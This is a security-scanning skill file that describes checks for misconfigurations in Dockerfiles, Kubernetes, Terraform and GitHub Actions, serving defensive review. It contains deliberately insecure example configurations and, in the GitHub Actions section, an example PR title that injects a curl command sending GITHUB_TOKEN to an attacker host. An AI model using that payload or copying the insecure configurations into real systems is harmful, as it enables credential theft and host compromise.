---
name: sc-iac
description: Infrastructure-as-Code security scanning — Dockerfile, Kubernetes, Terraform, and GitHub Actions misconfigurations
license: MIT
metadata:
  author: ersinkoc
  category: security
  version: "1.0.0"
---

# SC: Infrastructure-as-Code Security

## Purpose

Scans Infrastructure-as-Code files for security misconfigurations including Dockerfile anti-patterns, Kubernetes privilege escalation, Terraform resource exposure, and GitHub Actions injection vulnerabilities. Covers the full deployment pipeline from build to runtime.

## Activation

Called by sc-orchestrator during Phase 2 when IaC files are detected (Dockerfile, *.tf, k8s manifests, workflow files).

## Phase 1: Discovery

### File Patterns
```
**/Dockerfile*, **/docker-compose*, **/*.tf, **/*.tfvars,
**/k8s/*, **/kubernetes/*, **/helm/*, **/*.yaml, **/*.yml,
**/.github/workflows/*, **/.gitlab-ci.yml, **/Jenkinsfile
```

### Dockerfile Checks
```dockerfile
# VULNERABLE: Running as root
FROM node:18
COPY . /app
CMD ["node", "app.js"]  # Runs as root!

# SAFE: Non-root user
FROM node:18
RUN addgroup --system app && adduser --system --ingroup app app
COPY --chown=app:app . /app
USER app
CMD ["node", "app.js"]
```

- Running as root (missing USER directive)
- Secrets in build args (`ARG PASSWORD=secret`)
- Using `latest` tag for base images
- ADD instead of COPY (ADD can auto-extract and fetch URLs)
- Exposed unnecessary ports

### Kubernetes Checks
```yaml
# VULNERABLE: Privileged container
spec:
  containers:
  - name: app
    securityContext:
      privileged: true       # Full host access!
      runAsRoot: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /                # Mounting host filesystem!
```

- Privileged containers, hostPID, hostNetwork
- hostPath volume mounts
- Missing network policies
- Default service account with broad permissions
- Missing resource limits
- Missing securityContext (readOnlyRootFilesystem, runAsNonRoot)

### Terraform Checks
```hcl
# VULNERABLE: Public S3 bucket
resource "aws_s3_bucket" "data" {
  bucket = "my-data-bucket"
  acl    = "public-read"  # Publicly accessible!
}

# VULNERABLE: Overly permissive IAM
resource "aws_iam_policy" "admin" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = "*"        # Full admin access!
      Resource = "*"
    }]
  })
}
```

- Public S3 buckets, public RDS instances
- Overly permissive IAM policies (Action: *)
- Hardcoded credentials in .tf files
- Missing encryption (at rest and in transit)
- Security groups with 0.0.0.0/0 ingress

### GitHub Actions Checks
```yaml
# VULNERABLE: Script injection via PR title
- run: echo "PR: ${{ github.event.pull_request.title }}"
  # Attacker PR title: $(curl attacker.com/steal?token=$GITHUB_TOKEN)

# SAFE: Use environment variable
- run: echo "PR: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

- Expression injection in `run:` blocks
- `pull_request_target` with checkout of PR code
- Untrusted third-party actions without pinned SHA
- GITHUB_TOKEN with excessive permissions
- Secrets in workflow logs

## Severity Classification

- **Critical:** Privileged containers, hardcoded secrets in IaC, public databases, script injection in CI
- **High:** Running as root, overly permissive IAM, public storage, hostPath mounts
- **Medium:** Missing network policies, unpinned actions, missing encryption
- **Low:** Missing resource limits, using latest tags, minor configuration improvements

## Output Format

### Finding: IAC-{NNN}
- **Title:** {IaC misconfiguration type}
- **Severity:** Critical | High | Medium | Low
- **Confidence:** 0-100
- **File:** file/path:line
- **Vulnerability Type:** CWE-250 (Excessive Privileges) | CWE-732 (Incorrect Permission) | CWE-798 (Hardcoded Credentials)
- **Description:** {What was found}
- **Impact:** Container escape, data breach, lateral movement, supply chain attack.
- **Remediation:** {Specific fix with corrected configuration}
- **References:** https://cwe.mitre.org/data/definitions/250.html

## Common False Positives

1. **Development docker-compose** — running as root in local dev environment
2. **CI-only Dockerfiles** — build containers with elevated privileges for CI tasks
3. **Terraform plan output** — resource definitions that are overridden by variables
